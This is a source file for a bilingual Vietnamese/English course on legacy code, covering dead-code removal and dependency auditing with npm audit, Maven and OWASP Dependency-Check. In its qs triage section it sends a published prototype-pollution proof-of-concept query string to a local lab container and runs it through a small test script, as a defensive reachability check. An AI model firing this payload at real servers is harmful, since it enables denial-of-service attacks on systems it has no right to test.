<li>${en ? '<strong>Tests green before and after</strong>; for web code also the Chapter 3 golden master (JSPs are only compiled by Tomcat).' : '<strong>Test xanh trước và sau</strong>; với code web chạy thêm golden master của Chương 3 (JSP chỉ được Tomcat biên dịch).'}</li>
<li>${en ? '<strong>Write the evidence in the commit message</strong>, so <code>git revert</code> is obvious to whoever finds out you were wrong.' : '<strong>Ghi bằng chứng vào lời commit</strong>, để người phát hiện bạn nhầm biết ngay cách <code>git revert</code>.'}</li>
<li>${en ? '<strong>Never comment code out “just in case”.</strong> Git is the “just in case”.' : '<strong>Đừng bao giờ comment code "để phòng".</strong> Git chính là "để phòng".'}</li>
</ol>
${O61_XOA}
${O61_MSG}
<p>${en
  ? 'The test count drops from 33 to 32 and that is correct: the characterization test written in lesson 3.3 locked the behaviour of code that no longer exists. A test of dead code dies with it — deleting it is not “reducing coverage”.'
  : 'Số test giảm từ 33 xuống 32 và như vậy là đúng: characterization test viết ở bài 3.3 khoá hành vi của code không còn nữa. Test của code chết chết theo nó — xoá nó không phải "giảm độ phủ".'}</p>

<h3>💼 ${en ? 'OJT situation: the question to the customer' : 'Tình huống OJT: câu hỏi gửi khách'}</h3>
${out(`
[TV-103] Xác nhận chức năng "Xuất CSV cho kế toán" (ExportServlet) đã ngừng dùng

Chào chị Hạnh,
Trong lúc bảo trì, nhóm thấy chức năng xuất CSV danh sách sách (làm 10/2017) đã bị tắt từ 01/2018
(lý do ghi trong lịch sử: máy chủ mới không có ổ C:). Từ đó tới nay không có lượt truy cập nào.
Nhóm đề xuất xoá hẳn phần mã này trong bản phát hành tới.
Chị giúp xác nhận phòng kế toán không còn cần tệp CSV này (hoặc đã có nguồn khác) giúp em ạ.
Nếu vẫn cần, nhóm sẽ báo ước lượng để làm lại đúng cách (tải về qua trình duyệt, không ghi ra ổ đĩa máy chủ).
`)}
<p>${en
  ? 'Note what the message does: names the feature in business words, gives dates and evidence, proposes an action, and offers the alternative with a cost. A short email like this saves the “why did you delete my report?” call three months later. In the lab the customer answered that accounting has used the ERP report since 2018 — that answer is what the commit message cites.'
  : 'Để ý lá thư làm được gì: gọi tên chức năng bằng lời nghiệp vụ, đưa ngày tháng và bằng chứng, đề xuất hành động, và đưa phương án thay thế kèm chi phí. Một lá thư ngắn như vậy tránh được cuộc gọi "sao các em xoá báo cáo của chị?" ba tháng sau. Trong lab, khách trả lời phòng kế toán dùng báo cáo của ERP từ 2018 — câu trả lời đó là thứ lời commit dẫn ra.'}</p>

<h3>🎤 ${en ? 'What the interviewer will ask' : 'Phỏng vấn viên sẽ hỏi'}</h3>
<ol>
<li><strong>${en ? '“How do you know code is dead?”' : '"Làm sao em biết code đã chết?"'}</strong><br>${en
  ? 'Two kinds of evidence: static (no reference from any entry point — web.xml, annotations, JSPs, reflection, schedulers) and runtime (access logs or a coverage agent over a period that includes month-end and year-end jobs). If it is a business feature, the owner confirms.'
  : 'Hai loại bằng chứng: tĩnh (không điểm vào nào tham chiếu — web.xml, chú thích, JSP, phản chiếu, bộ lập lịch) và lúc chạy (access log hoặc agent đo phủ trong một khoảng phủ cả việc cuối tháng, cuối năm). Nếu là chức năng nghiệp vụ thì chủ nghiệp vụ xác nhận.'}</li>
<li><strong>${en ? '“Why not just comment it out?”' : '"Sao không comment lại cho chắc?"'}</strong><br>${en
  ? 'Commented code is never compiled or tested, rots silently, and every reader wastes time on it. Version control is the safety net; a good commit message makes the revert obvious.'
  : 'Code bị comment không bao giờ được biên dịch hay test, mục dần mà không ai biết, và người đọc nào cũng mất thời gian vì nó. Hệ quản lý phiên bản là lưới an toàn; lời commit tốt làm việc revert trở nên hiển nhiên.'}</li>
<li><strong>${en ? '“A tool says this dependency is unused. Do you remove it?”' : '"Công cụ báo thư viện này không dùng. Em có gỡ không?"'}</strong><br>${en
  ? 'Not on that alone. Bytecode analysis misses JSP taglibs, drivers loaded by name, and annotation processors — in our lab it flagged JSTL and the MySQL driver, both essential. I check how the library could be loaded, then remove it and run the full app, not only the unit tests.'
  : 'Không, nếu chỉ dựa vào đó. Phân tích bytecode bỏ sót taglib JSP, driver nạp theo tên, bộ xử lý chú thích — trong lab nó báo JSTL và driver MySQL, cả hai đều thiết yếu. Em kiểm thư viện có thể được nạp bằng đường nào, rồi gỡ và chạy cả ứng dụng, không chỉ unit test.'}</li>
</ol>

<h3>🗂 ${en ? 'Key terms' : 'Thuật ngữ trong bài'}</h3>
${thuatNgu(en, [
  ['Dead code', 'code chết', 'Code không còn đường nào chạy tới, hoặc có đường nhưng không ai cần kết quả.', 'Code that no path reaches, or whose result nobody needs.'],
  ['Remove Dead Code', 'xoá code chết', 'Phép refactor của Fowler: xoá, tin vào hệ quản lý phiên bản.', 'Fowler’s refactoring: delete it and trust version control.'],
  ['Entry point', 'điểm vào', 'Nơi framework gọi vào code của bạn: web.xml, chú thích, JSP, lịch, phản chiếu.', 'Where a framework calls your code: web.xml, annotations, JSPs, schedulers, reflection.'],
  ['Runtime coverage', 'độ phủ lúc chạy', 'Gắn agent (JaCoCo) vào server thật để biết hàm nào đã chạy.', 'Attaching an agent (JaCoCo) to a real server to see which methods ran.'],
  ['Tombstone', 'bia mộ', 'Dòng log đặt vào code nghi chết; im lặng đủ lâu thì xoá.', 'A log line placed in suspected dead code; delete after a long silence.'],
  ['Compile-time constant', 'hằng lúc biên dịch', 'static final nguyên thuỷ/String: giá trị được chép vào nơi gọi.', 'A static final primitive/String whose value is copied into callers.'],
])}

<h3>📌 ${en ? 'Summary' : 'Tóm tắt'}</h3>
<ul>
<li>${en ? 'Dead code has many shapes; an unmapped endpoint or a feature with no button is the dangerous kind.' : 'Code chết có nhiều dạng; điểm vào bị gỡ và chức năng không có nút là loại nguy hiểm.'}</li>
<li>${en ? 'Every tool lies somewhere: grep, dependency:analyze, short runtime windows, regex-based scripts.' : 'Công cụ nào cũng sai ở đâu đó: grep, dependency:analyze, cửa sổ đo ngắn, script dựa trên regex.'}</li>
<li>${en ? 'Two independent kinds of evidence + the owner’s word ⇒ delete in its own commit with the evidence in the message.' : 'Hai loại bằng chứng độc lập + lời chủ nghiệp vụ ⇒ xoá trong commit riêng, bằng chứng ghi trong lời commit.'}</li>
</ul>
${tlJetBrains(en)}
${lk(bai('git', 'git-2-3-blame-va-pickaxe'), '🔎', en ? 'Git 2.3 — blame and pickaxe' : 'Git 2.3 — blame và pickaxe', en ? 'log -S / -G: when did a line appear or vanish' : 'log -S / -G: một dòng xuất hiện hay biến mất khi nào')}
`);

/* ═══════════════════ 6.2 — Thư viện cũ ═══════════════════ */
const O62_AUDIT_DAU = out(`
$ node -v && npm -v
v14.21.3
6.14.18
$ npm audit --production
...
# Run  npm install moment@2.31.0  to resolve 2 vulnerabilities

  High            Path Traversal: 'dir/../../filename' in moment.locale
  Package         moment
  Dependency of   moment
  Path            moment
  More info       https://github.com/advisories/GHSA-8hfj-j24r-96c4
...
  Moderate        qs : qs.stringify with arrayFormat 'comma' throws an
                  uncaught TypeError on array elements carrying a non-callable
                  own toString (DoS)
  Package         qs
  Dependency of   express
  Path            express > body-parser > qs
  More info       https://github.com/advisories/GHSA-6pq8-jhm2-2vcw

found 24 vulnerabilities (8 low, 7 moderate, 9 high) in 51 scanned packages
  run \`npm audit fix\` to fix 2 of them.
  22 vulnerabilities require semver-major dependency updates.
`);
const O62_AUDIT_TT = out(`
$ npm audit --production --json | python3 tom-tat-audit.py
high      body-parser     <1.20.3            CVE-2024-45590    body-parser vulnerable to denial of service when url encod
low       serve-static    <1.16.0            CVE-2024-43800    serve-static vulnerable to template injection that can lea
low       express         <4.20.0            CVE-2024-43796    express vulnerable to XSS via response.redirect()
high      path-to-regexp  <0.1.10            CVE-2024-45296    path-to-regexp outputs backtracking regular expressions
low       cookie          <0.7.0             CVE-2024-47764    cookie accepts cookie name, path, and domain with out of b
high      qs              >=6.7.0 <6.7.3     CVE-2022-24999    qs vulnerable to Prototype Pollution
high      path-to-regexp  <0.1.12            CVE-2024-52798    path-to-regexp contains a ReDoS
low       send            <0.19.0            CVE-2024-43799    send vulnerable to template injection that can lead to XSS
high      moment          <2.29.2            CVE-2022-24785    Path Traversal: 'dir/../../filename' in moment.locale
high      moment          >=2.18.0 <2.29.4   CVE-2022-31129    Moment.js vulnerable to Inefficient Regular Expression Com
moderate  express         <4.19.2            CVE-2024-29041    Express.js Open Redirect in malformed URLs
low       qs              >=6.7.0 <=6.14.1   CVE-2026-2391     qs's arrayLimit bypass in comma parsing allows denial of s
moderate  qs              <6.14.1            CVE-2025-15284    qs's arrayLimit bypass in its bracket notation allows DoS
high      path-to-regexp  <0.1.13            CVE-2026-4867     path-to-regexp vulnerable to Regular Expression Denial of
low       body-parser     <1.20.6            CVE-2026-12590    body-parser vulnerable to denial of service when invalid l
moderate  qs              >=2.2.5 <6.16.0    CVE-2026-82417    qs: Denial of Service via Attacker Controlled isBuffer
high      body-parser     <1.20.9            CVE-2026-111181   body-parser vulnerable to Denial of Service via trailing b
moderate  qs              >=6.7.0 <=6.16.0   CVE-2026-110816   qs : qs.stringify with arrayFormat 'comma' throws an uncau
tong: 24 {'info': 0, 'low': 8, 'moderate': 7, 'high': 9, 'critical': 0}
`);
const O62_GREP = out(`
$ grep -rn "redirect\\|express\\.\\(json\\|urlencoded\\|static\\)\\|bodyParser\\|locale\\|req.query" app.js routes lib
routes/muon.js:9:router.use(express.json());
`);
const O62_QS = out(`
$ npm start &                                   # Node 14, cổng 3000 (lab: 41301)
$ curl -sg -m 10 -o /dev/null -w "%{http_code} %{time_total}s\\n" \\
    "$B/api/phieu/qua-han?a[__proto__]=b&a[__proto__]&a[length]=100000000"
200 0.004313s
$ curl -s -m 5 -o /dev/null -w "%{http_code} %{time_total}s\\n" "$B/api/phieu/qua-han"     # người dùng bình thường, ngay sau đó
200 0.002228s
$ docker stats --no-stream rfc-node14-api
rfc-node14-api  CPU 0.01%  MEM 10.7MiB / 31.17GiB
`);
const O62_QS_THU = out(`
$ node qs-thu.js            # gọi thẳng qs 6.7.0 với allowPrototypes: true như Express 4.17 làm
parse 1 ms object false 100000000 false
stringify 0 ms 28
`);
const C62_QS_THU = js(`
// qs-thu.js — chuỗi tấn công đi vào qs thế nào (chạy trong thư mục legacy-express, Node 14)
var qs = require('./node_modules/qs');
var t = Date.now();
var q = qs.parse('a[__proto__]=b&a[__proto__]&a[length]=100000000', { allowPrototypes: true });
console.log('parse', Date.now() - t, 'ms', typeof q.a, Array.isArray(q.a), q.a.length, Object.getPrototypeOf(q.a) === Array.prototype);
t = Date.now(); var s = JSON.stringify(q); console.log('stringify', Date.now() - t, 'ms', s.length);
`);
const O62_NANG = out(`
$ npm install express@4.22.3 moment@2.31.0 --save-exact
...
found 47 vulnerabilities (5 low, 23 moderate, 19 high)
  run \`npm audit fix\` to fix them, or \`npm audit\` for details
$ git diff --stat
 package-lock.json | 371 ++++++++++++++++++++++++++++++++++--------------------
 package.json      |   4 +-
 2 files changed, 234 insertions(+), 141 deletions(-)
$ npm audit --production

found 0 vulnerabilities
 in 71 scanned packages
$ npm test

Test Suites: 6 passed, 6 total
Tests:       21 passed, 21 total
Snapshots:   1 passed, 1 total
Time:        1.264 s
Ran all test suites.
$ git log --oneline -1
552c08c chore(6.2): express 4.17.1 -> 4.22.3, moment 2.24.0 -> 2.31.0 (npm audit --production 24 -> 0; 21 test xanh)
`);
const O62_REQUEST = out(`
$ npm view request deprecated
request has been deprecated, see https://github.com/request/request/issues/3142
$ npm install request@2.88.2 --save-exact        # bản sao thí nghiệm, KHÔNG phải repo lab
npm WARN deprecated request@2.88.2: request has been deprecated, see https://github.com/request/request/issues/3142
npm WARN deprecated uuid@3.4.0: uuid@10 and below is no longer supported.  For ESM codebases, update to uuid@latest.  For CommonJS codebases, use uuid@11 (but be aware this version will likely be deprecated in 2028).
npm WARN deprecated har-validator@5.1.5: this library is no longer supported
added 590 packages from 362 contributors and audited 591 packages in 6.205s
$ npm audit --production | tail -3
found 7 vulnerabilities (5 moderate, 1 high, 1 critical) in 115 scanned packages
  7 vulnerabilities require manual review. See the full report for details.
$ npm audit --production --json | python3 tom-tat-audit.py | grep -E "request|tough|form-data"
moderate  request         <=2.88.2           CVE-2023-28155    Server-Side Request Forgery in Request
moderate  tough-cookie    <4.1.3             CVE-2023-26136    tough-cookie Prototype Pollution vulnerability
critical  form-data       <2.5.4             CVE-2025-7783     form-data uses unsafe random function in form-data for choo
high      form-data       <2.5.6             CVE-2026-12143    form-data: CRLF injection in form-data via unescaped multip
`);
const O62_VERSIONS = out(`
$ mvn -B org.codehaus.mojo:versions-maven-plugin:2.18.0:display-dependency-updates
...
[INFO] The following dependencies in Dependencies have newer versions:
[INFO]   javax.servlet:javax.servlet-api ....................... 3.1.0 -> 4.0.1
[INFO]   javax.servlet.jsp:javax.servlet.jsp-api ............... 2.3.1 -> 2.3.3
[INFO]   junit:junit ........................................... 4.12 -> 4.13.2
[INFO]   mysql:mysql-connector-java .......................... 5.1.49 -> 8.0.33
[INFO]   org.junit.jupiter:junit-jupiter ................... 5.11.4 -> 6.2.0-M1
[INFO]   org.junit.vintage:junit-vintage-engine ............ 5.11.4 -> 6.2.0-M1
[INFO]   org.mockito:mockito-junit-jupiter ................... 4.11.0 -> 5.24.0
$ mvn -B org.codehaus.mojo:versions-maven-plugin:2.18.0:display-plugin-updates
...
[INFO]   org.pitest:pitest-maven .......................... 1.17.4 -> 1.30.2
...
[INFO] Require Maven 3.6.3 to use the following plugin updates:
[INFO]   maven-compiler-plugin ............................... 3.1 -> 3.16.0
[INFO]   maven-pmd-plugin ................................. 3.26.0 -> 3.28.0
[INFO]   maven-war-plugin ..................................... 2.2 -> 3.5.1
`);
const O62_ODC_LOI = out(`
$ mvn -B org.owasp:dependency-check-maven:12.1.9:check          # lần 1: JDK 8 của dự án
[ERROR] Failed to execute goal org.owasp:dependency-check-maven:12.1.9:check (default-cli) on project thuvien:
[ERROR] The plugin org.owasp:dependency-check-maven:12.1.9 has unmet prerequisites:
[ERROR] 	Required Java version 11 is not met by current version: 1.8.0_504
$ # lần 2: JDK 21 (ảnh maven:3.9-eclipse-temurin-21), dữ liệu NVD qua bản cache công khai của dự án
$ mvn -B org.owasp:dependency-check-maven:12.1.9:check \\
    -DnvdDatafeedUrl=https://dependency-check.github.io/DependencyCheck_Builder/nvd_cache/ -DossindexAnalyzerEnabled=false
[INFO] Download Started for NVD Cache - https://dependency-check.github.io/DependencyCheck_Builder/nvd_cache/nvdcve-2025.json.gz
org.owasp.dependencycheck.data.nvdcve.DatabaseException: Error updating 'CVE-2026-6785'; Value too long for column "URL CHARACTER VARYING(1000)": …
[ERROR] 	UpdateException: org.owasp.dependencycheck.utils.ForbiddenException: https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json - Server status: 403 - Server reason: Forbidden
[ERROR] 	NoDataException: No documents exist
`);
const O62_ODC = out(`
$ mvn -B org.owasp:dependency-check-maven:13.0.0:check \\
    -DnvdDatafeedUrl=https://dependency-check.github.io/DependencyCheck_Builder/nvd_cache/ \\
    -DossindexAnalyzerEnabled=false -DknownExploitedEnabled=false -Dformats=HTML,JSON,CSV
[INFO] NVD API Cache / Data Feed requires several updates; this could take a couple of minutes.
[INFO] Analysis Started
[INFO] Analysis Complete (1 seconds)
[WARNING] Sonatype OSS Index Analyzer disabled due to missing credentials. …
[WARNING]

One or more dependencies were identified with known vulnerabilities in thuvien Maven Webapp:

log4j-1.2.17.jar (pkg:maven/log4j/log4j@1.2.17, cpe:2.3:a:apache:log4j:1.2.17:*:*:*:*:*:*:*) : CVE-2019-17571, CVE-2020-9493, CVE-2022-23305, CVE-2022-23302, CVE-2022-23307, CVE-2023-26464
mysql-connector-java-5.1.49.jar (pkg:maven/mysql/mysql-connector-java@5.1.49, cpe:2.3:a:oracle:mysql_connector\\/j:5.1.49:*:*:*:*:*:*:*) : CVE-2023-22102, CVE-2019-2692

[INFO] BUILD SUCCESS
[INFO] Total time:  02:11 min
$ python3 tom-tat-odc.py target/dependency-check-report.json
6 jar duoc quet, 8 CVE
log4j-1.2.17.jar               CVE-2019-17571  9.8   CRITICAL  Included in Log4j 1.2 is a SocketServer class that is vulnerab
log4j-1.2.17.jar               CVE-2020-9493   9.8   CRITICAL  A deserialization flaw was found in Apache Chainsaw versions p
log4j-1.2.17.jar               CVE-2022-23305  9.8   CRITICAL  By design, the JDBCAppender in Log4j 1.2.x accepts an SQL stat
log4j-1.2.17.jar               CVE-2022-23302  8.8   HIGH      JMSSink in all versions of Log4j 1.x is vulnerable to deserial
log4j-1.2.17.jar               CVE-2022-23307  8.8   HIGH      CVE-2020-9493 identified a deserialization issue that was pres
log4j-1.2.17.jar               CVE-2023-26464  7.5   HIGH      ** UNSUPPORTED WHEN ASSIGNED ** When using the Chainsaw or Soc
mysql-connector-java-5.1.49.   CVE-2023-22102  8.3   HIGH      Vulnerability in the MySQL Connectors product of Oracle MySQL
mysql-connector-java-5.1.49.   CVE-2019-2692   6.3   MEDIUM    Vulnerability in the MySQL Connectors component of Oracle MySQ
`);
const O62_LOG4J = out(`
$ cat src/main/resources/log4j.properties
log4j.rootLogger=INFO, stdout
log4j.appender.stdout=org.apache.log4j.ConsoleAppender
log4j.appender.stdout.layout=org.apache.log4j.PatternLayout
log4j.appender.stdout.layout.ConversionPattern=%d{HH:mm:ss} %-5p %c{1} - %m%n
log4j.logger.com.thuvien=DEBUG
`);

const L62 = ml((en) => `
<span class="eyebrow">${en ? 'Chapter 6 · Dead code, old libraries and security debt' : 'Chương 6 · Code chết, thư viện cũ và nợ bảo mật'}</span>
<h2>${en ? '6.2 — Auditing dependencies: npm audit, the Maven Versions plugin, OWASP Dependency-Check' : '6.2 — Kiểm thư viện: npm audit, Maven versions plugin, OWASP Dependency-Check'}</h2>
<p class="lead">${en
  ? 'The medicine cabinet at your grandparents’ house: half the boxes expired years ago, some were recalled, and one is the only thing that still works for Grandpa’s knee. You do not throw everything away and you do not keep everything — you read each label. A legacy project’s dependencies are that cabinet. This lesson reads the labels with three tools, then does the part tools cannot: decide what actually affects <em>this</em> application.'
  : 'Tủ thuốc ở nhà ông bà: nửa số hộp hết hạn từ lâu, vài hộp đã bị thu hồi, và có một hộp là thứ duy nhất còn đỡ đau gối cho ông. Bạn không vứt hết, cũng không giữ hết — bạn đọc từng nhãn. Thư viện của một dự án cũ chính là cái tủ đó. Bài này đọc nhãn bằng ba công cụ, rồi làm phần công cụ không làm được: quyết định cái gì thật sự ảnh hưởng tới <em>ứng dụng này</em>.'}</p>
${moiTruong(en)}

<h3>${en ? 'Vocabulary first' : 'Từ vựng trước đã'}</h3>
<ul>
<li>${en ? '<strong>CVE</strong> — a public ID for one vulnerability (CVE-2021-44228 is Log4Shell). <strong>NVD</strong> (US NIST) enriches CVEs with scores and affected-product data (CPE). <strong>GHSA</strong> are GitHub’s advisory IDs, which npm audit uses.' : '<strong>CVE</strong> — mã công khai cho một lỗ hổng (CVE-2021-44228 là Log4Shell). <strong>NVD</strong> (của NIST, Mỹ) bổ sung điểm và danh sách sản phẩm bị ảnh hưởng (CPE). <strong>GHSA</strong> là mã khuyến cáo của GitHub, npm audit dùng mã này.'}</li>
<li>${en ? '<strong>CVSS</strong> — a 0–10 severity score computed from the attack vector, complexity, privileges and impact. It measures the vulnerability in general, not the risk in your app.' : '<strong>CVSS</strong> — điểm 0–10 tính từ đường tấn công, độ khó, quyền cần có và mức tác động. Nó đo lỗ hổng nói chung, không đo rủi ro trong ứng dụng của bạn.'}</li>
<li>${en ? '<strong>Transitive dependency</strong> — a library your library brings. In our lab <code>qs</code> arrives through <code>express</code> and <code>body-parser</code>; you never wrote its name.' : '<strong>Phụ thuộc bắc cầu</strong> — thư viện do thư viện của bạn kéo theo. Trong lab, <code>qs</code> đến qua <code>express</code> và <code>body-parser</code>; bạn chưa từng gõ tên nó.'}</li>
<li>${en ? '<strong>EOL (end of life)</strong> — no more fixes, even for new CVEs. log4j 1.x reached EOL in August 2015; Connector/J 5.1 in 2021.' : '<strong>EOL (hết vòng đời)</strong> — không còn bản sửa nào, kể cả cho CVE mới. log4j 1.x hết vòng đời tháng 8/2015; Connector/J 5.1 năm 2021.'}</li>
<li>${en ? '<strong>SCA (software composition analysis)</strong> — the family of tools that match your dependency list against vulnerability databases.' : '<strong>SCA (phân tích thành phần phần mềm)</strong> — họ công cụ đối chiếu danh sách thư viện của bạn với cơ sở dữ liệu lỗ hổng.'}</li>
</ul>

<h3>${en ? 'Why this matters: Equifax, 2017' : 'Vì sao quan trọng: Equifax, 2017'}</h3>
<p>${en
  ? 'On 7 March 2017 Apache published a fix for CVE-2017-5638, a remote-code-execution flaw in the Apache Struts framework. Equifax, one of the three US credit bureaus, had an internal process that required patching within 48 hours. Its online dispute portal still ran the vulnerable Struts version when attackers got in on 13 May; they stayed for 76 days and took data on about 147 million people. The US GAO report (GAO-18-559, August 2018) lists, among other causes, an incomplete inventory of where Struts was used and a scanner that did not find it. The fix existed for two months. What was missing was knowing what you run.'
  : 'Ngày 7/3/2017, Apache phát hành bản sửa cho CVE-2017-5638, lỗi cho phép chạy mã từ xa trong framework Apache Struts. Equifax, một trong ba công ty xếp hạng tín dụng lớn của Mỹ, có quy trình nội bộ đòi vá trong 48 giờ. Cổng khiếu nại trực tuyến của họ vẫn chạy bản Struts lỗi khi kẻ tấn công vào được ngày 13/5; chúng ở lại 76 ngày và lấy dữ liệu của khoảng 147 triệu người. Báo cáo của GAO Mỹ (GAO-18-559, tháng 8/2018) nêu, trong số các nguyên nhân, việc không có danh mục đầy đủ chỗ nào dùng Struts và máy quét không tìm ra nó. Bản sửa đã có từ hai tháng trước. Thứ thiếu là biết mình đang chạy cái gì.'}</p>

<h3>${en ? 'Node: npm audit on the legacy API' : 'Node: npm audit trên API cũ'}</h3>
${O62_AUDIT_DAU}
${O62_AUDIT_TT}
<p>${en
  ? '“24 vulnerabilities” is 18 advisories counted once per path (the same <code>qs</code> bug reached through <code>express</code> and through <code>body-parser</code> counts twice). Two lines of the summary are misleading on purpose-built old projects: “22 require semver-major updates” is wrong for Express — 4.22.3 is still 4.x. npm 6 says it because <code>package.json</code> pins <code>"express": "4.17.1"</code> exactly, so no version satisfies the range. Exact pins are common in legacy repos (someone was burned once) and they make <code>npm audit fix</code> nearly useless.'
  : '"24 lỗ hổng" là 18 khuyến cáo, đếm theo từng đường dẫn (cùng một lỗi <code>qs</code> đi qua <code>express</code> và qua <code>body-parser</code> tính hai lần). Hai dòng tóm tắt ở cuối dễ đánh lừa với dự án cũ: "22 cần nâng bản major" là sai với Express — 4.22.3 vẫn là 4.x. npm 6 nói vậy vì <code>package.json</code> ghim đúng <code>"express": "4.17.1"</code>, nên không bản nào lọt vào khoảng cho phép. Ghim cứng rất hay gặp ở repo cũ (ai đó từng bị bỏng) và nó làm <code>npm audit fix</code> gần như vô dụng.'}</p>

<h3>${en ? 'Triage by reachability — measure, do not guess' : 'Phân loại theo khả năng chạm tới — đo, đừng đoán'}</h3>
<p>${en
  ? 'A HIGH in someone else’s code is only a risk if your inputs can reach the vulnerable function. First, find which features of each library this API uses at all:'
  : 'Một lỗi HIGH trong code người khác chỉ thành rủi ro nếu dữ liệu đầu vào của bạn chạm được tới hàm bị lỗi. Trước hết, xem API này dùng những tính năng nào của từng thư viện:'}</p>
${O62_GREP}
<table>
<tr><th>${en ? 'Advisory' : 'Khuyến cáo'}</th><th>${en ? 'Needs' : 'Cần điều kiện'}</th><th>${en ? 'In legacy-express' : 'Trong legacy-express'}</th></tr>
<tr><td>body-parser CVE-2024-45590</td><td>${en ? 'urlencoded parser enabled' : 'bật bộ đọc urlencoded'}</td><td>${en ? 'only <code>express.json()</code> — not reachable' : 'chỉ có <code>express.json()</code> — không chạm tới'}</td></tr>
<tr><td>express CVE-2024-43796, CVE-2024-29041</td><td><code>res.redirect()</code> ${en ? 'with user input' : 'với dữ liệu người dùng'}</td><td>${en ? 'no redirect anywhere — not reachable' : 'không có redirect nào — không chạm tới'}</td></tr>
<tr><td>moment CVE-2022-24785</td><td><code>moment.locale(userInput)</code></td><td>${en ? 'never called — not reachable' : 'không gọi — không chạm tới'}</td></tr>
<tr><td>moment CVE-2022-31129</td><td>${en ? 'parsing a long user-supplied date string' : 'đọc chuỗi ngày dài do người dùng gửi'}</td><td>${en ? 'only parses dates stored by the API itself — not reachable today, reachable the day someone adds a date filter' : 'chỉ đọc ngày do chính API lưu — hôm nay không chạm tới, chạm tới ngay ngày ai đó thêm bộ lọc theo ngày'}</td></tr>
<tr><td>qs CVE-2022-24999</td><td>${en ? 'query string parsing (every Express route)' : 'đọc query string (mọi route Express)'}</td><td>${en ? 'parsed on every request — <strong>test it</strong>' : 'đọc ở mọi request — <strong>thử thật</strong>'}</td></tr>
</table>
<p>${en
  ? 'The <code>qs</code> one is parsed on every request, so we attack our own copy (Node 14, local container, nobody else’s server) with the published proof-of-concept string:'
  : 'Lỗi <code>qs</code> được đọc ở mọi request, nên ta tấn công chính bản sao của mình (Node 14, container cục bộ, không phải máy chủ của ai khác) bằng chuỗi PoC đã công bố:'}</p>
${O62_QS}
${C62_QS_THU}
${O62_QS_THU}
<p>${en
  ? 'No hang: 200 in 4 ms, and the next user is served normally. The parse does produce a poisoned object (<code>a.length</code> is 100000000) — the danger appears only when application code treats <code>req.query.a</code> as an array and loops over it, which this API never does. Verdict: real bug, not exploitable here today, upgrade in a normal PR rather than a 2 a.m. hotfix. Without the measurement, both “HIGH, stop everything” and “not our problem” would have been guesses.'
  : 'Không treo: 200 trong 4 ms, người dùng kế tiếp vẫn được phục vụ bình thường. Bước đọc đúng là tạo ra một đối tượng bị đầu độc (<code>a.length</code> bằng 100000000) — nguy hiểm chỉ xuất hiện khi code ứng dụng coi <code>req.query.a</code> là mảng và chạy vòng lặp trên nó, điều API này chưa bao giờ làm. Kết luận: lỗi có thật, hôm nay không khai thác được ở đây, nâng cấp trong một PR bình thường chứ không phải bản vá khẩn lúc 2 giờ sáng. Không đo, thì cả "HIGH, dừng hết lại" lẫn "không phải việc của mình" đều chỉ là đoán.'}</p>

<h3>${en ? 'The fix: two patch-level upgrades, tests as the referee' : 'Cách sửa: hai lần nâng bản vá, test làm trọng tài'}</h3>
${O62_NANG}
<p>${en
  ? 'Production: 24 → 0, all 21 characterization tests from Chapters 3–5 still green. The remaining 47 are in <code>devDependencies</code> (Jest 26 and its tree); they never ship to the server, and fixing them means Jest 29 — a major upgrade with its own changes, scheduled for Chapter 7. Always read audit output with <code>--production</code> first: that is what attackers can reach.'
  : 'Production: 24 → 0, cả 21 characterization test của Chương 3–5 vẫn xanh. 47 lỗi còn lại nằm trong <code>devDependencies</code> (Jest 26 và cây của nó); chúng không bao giờ lên máy chủ, và sửa chúng nghĩa là Jest 29 — một lần nâng major có thay đổi riêng, để dành Chương 7. Luôn đọc kết quả audit với <code>--production</code> trước: đó là thứ kẻ tấn công chạm được.'}</p>

<h3>${en ? 'A deprecated library: request' : 'Một thư viện đã bị bỏ: request'}</h3>
<p>${en
  ? 'Many Node projects from 2014–2019 used <code>request</code> for outgoing HTTP calls. Its maintainers deprecated it in February 2020. On a throw-away copy (not the lab repo), installing it shows what “deprecated” looks like in practice:'
  : 'Rất nhiều dự án Node 2014–2019 dùng <code>request</code> để gọi HTTP ra ngoài. Người bảo trì tuyên bố ngừng phát triển nó từ tháng 2/2020. Trên một bản sao bỏ đi được (không phải repo lab), cài nó vào cho thấy "deprecated" trông thế nào ngoài đời:'}</p>
${O62_REQUEST}
<p>${en
  ? 'One line in <code>package.json</code> brought 44 production packages (71 ⇒ 115) and 7 vulnerabilities, including a CRITICAL in <code>form-data</code> that no version of <code>request</code> will ever fix. If you meet <code>request</code> in a legacy repo, the replacement is a code change, not a version bump: <code>undici</code>/global <code>fetch</code> on Node 18+, or <code>axios</code>/<code>got</code> on older runtimes. Plan it with the Node upgrade (lesson 7.4), behind characterization tests of the outgoing calls.'
  : 'Một dòng trong <code>package.json</code> kéo thêm 44 gói production (71 ⇒ 115) và 7 lỗ hổng, trong đó có một CRITICAL ở <code>form-data</code> mà không bản <code>request</code> nào sẽ sửa. Gặp <code>request</code> trong repo cũ thì thay thế là việc sửa code, không phải đổi số phiên bản: <code>undici</code>/<code>fetch</code> có sẵn từ Node 18, hoặc <code>axios</code>/<code>got</code> với runtime cũ hơn. Lên kế hoạch cùng lần nâng Node (bài 7.4), sau khi có characterization test cho các lời gọi ra ngoài.'}</p>

<h3>${en ? 'Java: what is out of date — the Versions plugin and its traps' : 'Java: cái gì đã cũ — Versions plugin và những cái bẫy'}</h3>
${O62_VERSIONS}
<p>${en
  ? 'Useful, and wrong in three instructive ways:'
  : 'Hữu ích, và sai theo ba cách đáng học:'}</p>
<ul>
<li>${en ? '<strong>Milestones offered as updates:</strong> <code>6.2.0-M1</code> is a pre-release. Never upgrade a customer project to a milestone; filter them with a rules file or read the list by eye.' : '<strong>Bản thử nghiệm được gợi ý như bản mới:</strong> <code>6.2.0-M1</code> là bản trước phát hành. Đừng bao giờ đưa dự án của khách lên bản milestone; lọc bằng tệp luật hoặc tự đọc danh sách.'}</li>
<li>${en ? '<strong>Renamed artifacts:</strong> “5.1.49 → 8.0.33” is the last version under the <em>old</em> name <code>mysql:mysql-connector-java</code>. The driver moved to <code>com.mysql:mysql-connector-j</code> and, by late 2026, to calendar versions (26.10.0). The plugin cannot follow a rename.' : '<strong>Thư viện đổi tên:</strong> "5.1.49 → 8.0.33" là bản cuối dưới tên <em>cũ</em> <code>mysql:mysql-connector-java</code>. Driver đã chuyển sang <code>com.mysql:mysql-connector-j</code> và, tới cuối 2026, sang cách đánh số theo lịch (26.10.0). Plugin không lần theo được việc đổi tên.'}</li>
